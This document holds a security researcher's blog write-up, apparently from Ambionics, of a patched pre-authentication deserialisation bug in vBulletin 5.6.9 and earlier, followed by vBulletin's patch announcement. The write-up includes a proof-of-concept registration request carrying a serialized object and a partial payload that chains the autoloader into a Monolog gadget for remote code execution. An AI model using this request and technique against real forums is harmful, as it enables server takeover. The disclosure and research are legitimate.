=== Content from www.ambionics.io_c9eee6e0_20250115_095055.html ===
[![Logo](/theme/images/logo/logo_condensed_white.png)](/ "home")

* [How it works](/how-it-works "How it works")
* [Offers](/offers "Offers")
* [About](/about "About")
* [Blog](/blog/ "Blog")
* [Contact](/contact "Contact")
## Unserializable, but unreachable: Remote code execution on vBulletin

#####

![Polygonal Background](/theme/images/bkgd-top-edge.png)
###### 31 January, 2023

* Posted By Charles Fol
* vbulletin rce exploit unserialize autoload 0-day
![Full Article](/images/vbulletin-unserializable-but-unreachable/vbulletin-unserializable-but-unreachable.png)
# vBulletin <= 5.6.9: Pre-authentication Remote Code Execution

In late August of 2022, we reported a pre-authentication remote code execution vulnerability to [vBulletin](https://vbulletin.com/). The bug was due to an improper handling of non-scalar data in the ORM, which led to an **arbitrary deserialisation**. However, the exploitation was not as straight-forward as expected.

*The bug was patched in [5.6.9 PL1, 5.6.8 PL1, and 5.6.7 PL1](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4473890-vbulletin-5-6-9-security-patch). No CVE was issued.*

*This blogpost describes the same bug as the one presented at Beerump in September 2022.*

# Is this serialized ?

vBulletin's Object-Relational Mapper (ORM) is pretty simple. Every persistent object extends `vB_DataManager` and defines a `validfields` attribute that lists its fields and their properties. As an example, here's how the first fields of the `User` class look like:

```
class vB_DataManager_User extends vB_DataManager
{
    /**
    * Array of recognised and required fields for users, and their types
    *
    * @var  array
    */
    protected $validfields = array(
        'userid'             => array(
            vB_Cleaner::TYPE_UINT,
            vB_DataManager_Constants::REQ_INCR,
            vB_DataManager_Constants::VF_METHOD,
            'verify_nonzero'
        ),
        'username'           => array(
            vB_Cleaner::TYPE_STR,
            vB_DataManager_Constants::REQ_YES,
            vB_DataManager_Constants::VF_METHOD
        ),
        'email'              => array(
            vB_Cleaner::TYPE_STR,
            vB_DataManager_Constants::REQ_YES,
            vB_DataManager_Constants::VF_METHOD,
            'verify_useremail'
        ),
        ...
    );

```

For each field, we have an array describing its type, whether it's a required field, and a function to verify that the value is correct and modify it if necessary.

As an example, `email` is a field of type string (`vB_Cleaner::TYPE_STR`), is required (`vB_DataManager_Constants::REQ_YES`), and needs to be validated with the `verify_useremail()` method.

Whenever a user registers, vBulletin tries to create a `vB_DataManager_User` instance with all the given fields. If any validation error happens (incorrect type, validation function returning false), the process yields an error.

Now, in addition to scalar fields, vBulletin sometimes needs to store complex types, such as arrays. To do so, vBulletin chooses to serialize the data: when a field is supposed to be an array, it is serialized (by calling `serialize()`) before being stored in the database, and deserialized (by calling `unserialize()`) when taken out of the database. This approach does not present security risks, if implemented correctly.

One such array field is `searchprefs`, of the `vB_DataManager_User` class:

```
    'searchprefs'        => array(
        vB_Cleaner::TYPE_NOCLEAN,
        vB_DataManager_Constants::REQ_NO,
        vB_DataManager_Constants::VF_METHOD,
        'verify_serialized'
    ),

```

The field has no type restrictions, is not required, and is due to be validated using `verify_serialized()`, a function name that foreshadows a dubious implementation.

Indeed, how do you verify that a value is serialized ?

```
function verify_serialized(&$data)
{
    if ($data === '')
    {
        $data = serialize(array());
        return true;
    }
    else
    {
        if (!is_array($data))
        {
            $data = unserialize($data); // <---------
            if ($data === false)
            {
                return false;
            }
        }

        $data = serialize($data);
    }

    return true;
}

```

There's probably lots of ways to do it, but vBulletin does it wrong: it deserializes the data and checks for errors.

Now, since the `searchprefs` field can be submitted by users when they register, this gives an attacker a pre-authentication `unserialize()`. Here's a POC:

```
POST /ajax/api/user/save HTTP/1.1
Host: 172.17.0.2

securitytoken=guest
&options=
&adminoptions=
&userfield=
&userid=0
&user[email]=pown@pown.net
&user[username]=toto
&password=password
&user[password]=password
&user[searchprefs]=O:12:"PDOStatement":0:{}

```

A deserialisation, in PHP, on a huge framework such as vBulletin: we expected to convert this bug to RCE very fast. This, however, proved harder than expected.

# Useless or unreachable

When exploiting `unserialize()`, there are generally two ways to go: either we use [PHPGGC](https://github.com/ambionics/phpggc) to generate a payload for well-known libraries, or we find a new gadget chain in the code. In vBulletin's case, the two options are not optimal.

The second option is a no-go: virtually every vBulletin classes uses the `vB_Trait_NoSerialize` trait, which raises an exception when `__wakeup()`, `__unserialize()` and the likes get called. So, code produced by vBulletin devs cannot be used for exploitation.

```
trait vB_Trait_NoSerialize
{
    public function __wakeup()
    {
        throw new Exception('Serialization not supported');
    }

    public function __unserialize()
    {
        throw new Exception('Serialization not supported');
    }

    ...
}

```

On the other hand, a quick look at the project reveals the use of the [Monolog](https://github.com/Seldaek/monolog) library, which PHPGGC supports. However, if we try to exploit with a `monolog/rce*` payload, we're unsuccessful.

The reason is simple. Although physically present under `packages/googlelogin/vendor/monolog`, the Monolog library is **unreachable**: the *googlelogin* package is by default disabled in vBulletin, and as a result none of its files are loaded by vB. This means that its `vendor/autoload.php`, which contains the autoloader for Monolog classes, is not `include()`d either. As a result, PHP has no knowledge of these classes. That's a bummer: as useful as the [autoloading](https://www.php.net/manual/en/language.oop5.autoload.php) mechanism is, if you don't load the autoloader, you cannot load classes.

We therefore have two opposite cases, both equally useless: in one case (*vBulletin*), we can load any class, but they are all useless, and in the other (*Monolog*), we'd happily use the classes, but we cannot load them.

Luckily, instanciating objects is not the only thing we can do with an arbitrary `unserialize()`. We also get to call autoloaders. Which begs the question: what does vBulletin's autoloader do ?

## vBulletin's autoloading

As every modern PHP project, vBulletin defines an autoloader. Although a bit convoluted, it boils down to this (simplified) code:

```
spl_autoload_register(array('vB', 'autoload'));

class vB
{
    public static function autoload($classname, $load_map = false, $check_file = true)
    {
        $fclassname = strtolower($classname);
        $segments = explode('_', $fclassname);

        switch($segments[0]) // [1]
        {
            case 'vb':
                $vbPath = true;
                $filename = VB_PATH; // ./vb/
                break;
            case 'vb5':
                $vbPath = true;
                $filename = VB5_PATH; // ./vb5/
                break;
            default:
                $vbPath = false;
                $filename = VB_PKG_PATH; // ./packages/
                break;
        }

        if (sizeof($segments) > ($vbPath ? 2 : 1))
        {
            $filename .= implode('/', array_slice($segments, ($vbPath ? 1 : 0), -1)) . '/'; // [2]
        }

        $filename .= array_pop($segments) . '.php'; // [3]

        if(file_exists($filename))
            require($filename); // [4]
    }
}

```

In essence, the autoloader takes a *classname*, converts it to lowercase, and then splits it in `_`-delimited segments. The first segment is used to determine the base directory 1, while the others are simply used as directory names 2. The last segment defines the name of the file 3. The computed filepath is then included 4.

As an example, the first time vBulletin instanciates `vB_DataManager_User`, the class is unknown to PHP. Consequently, it calls every classloader, including `vB::autoload()`, which generates the name of the file that contains the class, `vb/datamanager/user.php`, and loads said file. The class is now defined, and PHP can instanciate it.

The vBulletin autoloader has an interesting property: given a classname, it can include any PHP file in the project tree. For instance, running `new A_B_C();` would force the autoloader to include `a/b/c.php`. Sadly, although the file inclusion would work, the code would eventually crash, as the `A_B_C` class does not exist.

Now, when it comes to loading classes, `unserialize()` has a quirk: if you deserialize an object whose class name is not found (even after running the autoloaders), the function **will not** raise an exception or fail, as we'd expect it to. It will return an instance of `__PHP_Incomplete_Class` instead. The object is pretty useless for an attacker, as you cannot access its attributes or call its methods. However, the important part is that the **deserialisation process** does not crash, it **keeps going**.

# Autoloading the autoloader

You probably know where this is going. We want to include `packages/googlelogin/vendor/autoload.php`, which contains the autoloader for `Monolog` classes. We'll use a **fake class name** for this. If we deserialize this payload:

```
O:27:"googlelogin_vendor_autoload":0:{}

```

The following steps happen:

* `unserialize()` tries to load class `googlelogin_vendor_autoload`
* It does not exist, so autoloaders are called
* `vB::autoload()` constructs the filename `packages/googlelogin/vendor/autoload.php` and **includes** it
* Although the file exists, the class named `googlelogin_vendor_autoload` does **not**
* As a result, `unserialize()` returns `__PHP_Incomplete_Class`
* and the execution continues...

We just made vBulletin's autoloader include another autoloader. And as a result, Monolog classes would now be in scope. An exploit is right around the corner: we send an array with, as its first item, our fake class, and as second item, the `Monolog` payload generated by PHPGGC.

```
a:2:{i:0;O:27:"googlelogin_vendor_autoload":0:{}i:1;O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";...}}

```
# Exploit

To exploit, we generate the [payload with PHPGGC](https://github.com/ambionics/phpggc/blob/master/gadgetchains/vBulletin/RCE/1/chain.php):

![](/images/vbulletin-unserializable-but-unreachable/phpggc.png)

and run one request:

![](/images/vbulletin-unserializable-but-unreachable/exploit.png)

We got pre-auth code execution.

# Conclusion

We successfully converted a *0-day pre-authentication `unserialize()`* on vBulletin to *a remote code execution* vulnerability, despite the heavy mitigations put in place by the application.

A generalisation of the technique could allow, for instance, to convert file write gadget chains into direct remote code execution; this might get implemented in [PHPGGC](https://github.com/ambionics/phpggc) at a later date.

# We're hiring!

Ambionics is an entity of [Lexfo](https://www.lexfo.fr/), and we're hiring! To learn more about job opportunities, do not hesitate to contact us at rh@lexfo.fr. *We're a french-speaking company, so we expect candidates to be fluent in our beautiful language.*

[How it works](/how-it-works "How it works") [Offers](/offers "Offers") [About](/about "About") [Blog](/blog/ "Blog") Cookies [Legal notice](/legal "Legal")

Copyright 2024 Ambionics Security by LEXFO. All Rights Reserved.

We use cookies to see how our website is being used. If you continue browsing the site, you consent to this. Learn more about cookies and configure your settings.

AcceptConfigure

Ã
#### Cookies management

A cookie is a piece of information deposited on a web userâs hard drive by the server of the website they are browsing. It contains several data points: the name of the server which deposited it, a unique ID number, possibly an expiry date.
 This information is sometimes hosted on the computer in a simple text file the server then accesses to read and write information.

Two types of Cookies are deposited and/or read from the Site:

* An audience-measuring cookie (Google Analytics) which allows it to analyze the Userâs browsing and measure the audience of the Site (number of visits, number of pages seen, visitorsâ activity on the Site, frequency of return visits on the Site).
* A User interface customization cookie that allows for the language chosen by the User by clicking the appropriate flag (French or English) to be remembered.

The User is informed that:

* The audience-measuring cookie (Google Analytics) is valid for 12 months starting from its initial deposit on the Userâs terminal.
* The User interface customization cookie is valid for 12 months starting from its initial deposit on the Userâs terminal.

The User is informed that they may oppose the deposit and/or consultation of cookies using their browserâs settings prior to their deposit and one by one.

Each browserâs settings are different, the User can find the steps to follow to manage cookies in the Help section of their browser.

---

Google AnalyticsAcceptDeny

=== Content from forum.vbulletin.com_8aba6a02_20250115_095055.html ===


* Login or Sign Up
  + Logging in...

    Remember me

    Log in

    Or
    [Sign Up](https://forum.vbulletin.com/register?urlpath=aHR0cHM6Ly9mb3J1bS52YnVsbGV0aW4uY29tLy9mb3J1bS92YnVsbGV0aW4tYW5ub3VuY2VtZW50cy92YnVsbGV0aW4tYW5ub3VuY2VtZW50c19hYS80NDczODkwLXZidWxsZXRpbi01LTYtOS1zZWN1cml0eS1wYXRjaA%3D%3D)

    [Forgot password or user name?](https://forum.vbulletin.com/lostpw)
  + Log in with
    Facebook
    Sign-in with Twitter
    Sign-in with Google

[![Logo](images/misc/vb_logo_darkblue.svg "Powered by vBulletin")](https://forum.vbulletin.com/)

* + Search in titles only
    Search in vBulletin Announcements only
    Search
  + Advanced Search

* Forums
* [Articles](articles)
* [Blogs](blogs)
* [Add-ons](add-ons)
* [Purchase](https://www.vbulletin.com/purchases/)

* [Trending Topics](trending)
* [Member List](memberlist)
* [Calendar](calendar)

* [Home](https://forum.vbulletin.com)
* [Forum](https://forum.vbulletin.com/forum)
* [vBulletin Announcements](https://forum.vbulletin.com/forum/vbulletin-announcements)
* [vBulletin Announcements](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa)

* Welcome to the vBulletin support forums! In our community forums you can receive professional support and assistance with any issues you might have with your vBulletin Products.

  Useful Links for Guests: [Community Registration](https://forum.vbulletin.com/register) | [vBulletin System Requirements](https://forum.vbulletin.com/node/4387853) | [vBulletin Installation Guide](https://forum.vbulletin.com/node/4391348)

  If you are having problems posting in the relevant areas for your software, please see this [topic](https://forum.vbulletin.com/forum/vbulletin-sales-and-feedback/site-feedback/81568-why-can-t-i-post-or-download-files#post3514457).

# vBulletin 5.6.9 Security Patch

Collapse

X

Collapse

* [Posts](#thread-view-tab)
* [Latest Activity](#stream-view-tab)
* [Photos](#media-view-tab)

* Page

  of
  1
* Filter

* Time
  All Time
  Today
  Last Week
  Last Month
* Show
  All
  Discussions only
  Photos only
  Videos only
  Links only
  Polls only
  Events only

Filtered by:

Clear All

 new posts

Previous
[template](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4473890-vbulletin-5-6-9-security-patch)
Next

* [![Wayne Luke](./core/custompics/avatar/avatar868_18.png "Wayne Luke")](https://forum.vbulletin.com/member/868-wayne-luke)

  **[**Wayne Luke**](https://forum.vbulletin.com/member/868-wayne-luke)**

  vBulletin Technical Support Lead
  + Join Date: Aug 2000
  + Posts: 75411
  + vBulletin Version: 6.X
  + [Share](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4473890-vbulletin-5-6-9-security-patch%23post4473890)
  + [![](data:image/svg+xml...)
    Tweet](https://twitter.com/intent/tweet?text=vBulletin+5.6.9+Security+Patch&url=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4473890-vbulletin-5-6-9-security-patch%23post4473890)

  ---

  [#1](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4473890-vbulletin-5-6-9-security-patch#post4473890)

  ## vBulletin 5.6.9 Security Patch

  Thu 25 Aug '22, 2:01pm

  A security issue has been reported to the vBulletin team. To fix this issue, we have created a new security patch.

  You can download the patch for your version in the [Member's Area](http://members.vbulletin.com/patches.php)

  We have made patches available for the following versions of vBulletin Connect:

  + 5.6.9 PL1
  + 5.6.8 PL1
  + 5.6.7 PL1

  vBulletin 5.7.0 RC 2 has been made available with this patch.

  ## Installing the Patch

  For the best results with your vBulletin site, it is recommended to upgrade to vBulletin 5.6.9 PL1 if you are not using 5.6.9 currently.

  ### Using PHAR (default download)

  Due to the PHAR download, you will need to download the complete vBulletin package for your version and replace the /core/vb/vb.phar file to apply the security fix. This file will show up as a false positive in your Suspect File Diagnostics. If you replace all files from the new download, then the false positive will not occur.

  ### Patching

  1. Download the appropriate files for your version of vBulletin 5.6.X
  2. Upload all files found within the zip file to your server. Make sure to overwrite the existing files on your server.
  ## Older Versions

  All older versions should be considered vulnerable. Sites running older versions of vBulletin need to be upgraded to vBulletin 5.6.9 PL1 as soon as possible. For more information on upgrading please see [Quick Overview: Upgrading vBulletin Connect](https://forum.vbulletin.com/node/4391346) in the support forums.

  ## vBulletin Cloud

  vBulletin Cloud sites have been patched.

  ​

  Last edited by [Wayne Luke](https://forum.vbulletin.com/member/868-wayne-luke); Tue 30 Aug '22, 9:26am.

  Translations provided by Google.

  ---

  Wayne Luke

  [The Rabid Badger](http://forums.rabidbadger.io) - a vBulletin Cloud demonstration site.

  [vBulletin 5 API](http://vb5support.com/api)

  **Tags:**
  None
  👍

  2

* [![Wayne Luke](./core/custompics/avatar/avatar868_18.png "Wayne Luke")](https://forum.vbulletin.com/member/868-wayne-luke)

  **[**Wayne Luke**](https://forum.vbulletin.com/member/868-wayne-luke)**

  vBulletin Technical Support Lead
  + Join Date: Aug 2000
  + Posts: 75411
  + vBulletin Version: 6.X
  + [Share](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4473890-vbulletin-5-6-9-security-patch%3Fp%3D4473935%23post4473935)
  + [![](data:image/svg+xml...)
    Tweet](https://twitter.com/intent/tweet?text=&url=https%3A%2F%2Fforum.vbulletin.com%2Fforum%2Fvbulletin-announcements%2Fvbulletin-announcements_aa%2F4473890-vbulletin-5-6-9-security-patch%3Fp%3D4473935%23post4473935)

  ---

  [#2](https://forum.vbulletin.com/forum/vbulletin-announcements/vbulletin-announcements_aa/4473890-vbulletin-5-6-9-security-patch?p=4473935#post4473935)

  Fri 26 Aug '22, 10:32am

  Due to an uncaught issue in the package build system, Patch versions were not built correctly. On download, you would have received a patch/version download that was x.x.1 version higher than requested. This issue has been corrected.

  On your site, you have several options to correct the issue.

  1. If you're not running 5.6.9 PL1, it is recommended to complete a full upgrade to this version.

  2. If you meant to download the 5.6.9 PL1 patch and received the 5.7.0 RC2 patch instead, you can replace the files with the appropriate version.

  3. If you downloaded the full package, received vBulletin 5.7.0 RC2, and ran the upgrade scripts then your best bet is to stay on 5.7.0 RC2 until the full release is made.

  Translations provided by Google.

  ---

  Wayne Luke

  [The Rabid Badger](http://forums.rabidbadger.io) - a vBulletin Cloud demonstration site.

  [vBulletin 5 API](http://vb5support.com/api)

  👍

  1

  ## Comment

  Post
  Cancel

Previous
template
Next

widgetinstance 262 (Related Topics) skipped due to lack of content & hide\_module\_if\_empty option.

(vbulletin-forum1.internetbrands.com)

* Default Style
  + Default Style
  + - vB5 Style
  + - Pink
  + - Black Red
  + - Blue Yellow
  + - Cool Blue
  + - Denim
  + - Gradient
  + - Grey Stripes
  + - Grunge
  + - Light Blue
  + - Old School
  + - Orange Purple
  + - Blue Green
  + - Red
  + - Stripes
  + - Wood
  + - Dark
  + - Winter
  + - vBulletin Default Theme
  + - Halloween
* English (US)
  + Deutsch (Du)
  + English (US)
  + French
  + Right-to-Left Test
  + Spanish

* [Help](https://forum.vbulletin.com/help)
* [Member's Area](http://members.vbulletin.com)
* [Manual](http://www.vbulletin.com/docs/html)
* [Submit Ticket](http://www.vbulletin.com/go/techsupport)
* [Privacy Policy](https://www.internetbrands.com/privacy/privacy-highlights.html?site=www.vbulletin.com)
* [Terms of Use](https://www.internetbrands.com/ibterms/)
* [Cookie Policy](https://www.internetbrands.com/privacy/cookie-policy)
* [Forum Rules](https://forum.vbulletin.com/terms-of-service)
* [Contact Us](https://forum.vbulletin.com/contact-us)
* Go to top

Manage Preferences

Your Privacy Choices![](https://icons.internetbrands.com/ccpa/privacyoptions29x14.png)

Powered by [vBulletin®](https://www.vbulletin.com) Version 6.0.8
Copyright © 2025 MH Sub I, LLC dba vBulletin. All rights reserved.
All times are GMT-8. This page was generated at 1:50am.

Working...

Yes
No

OK

OK
Cancel

😀

😂

🥰

😘

🤢

😎

😞

😡

👍

👎

☕


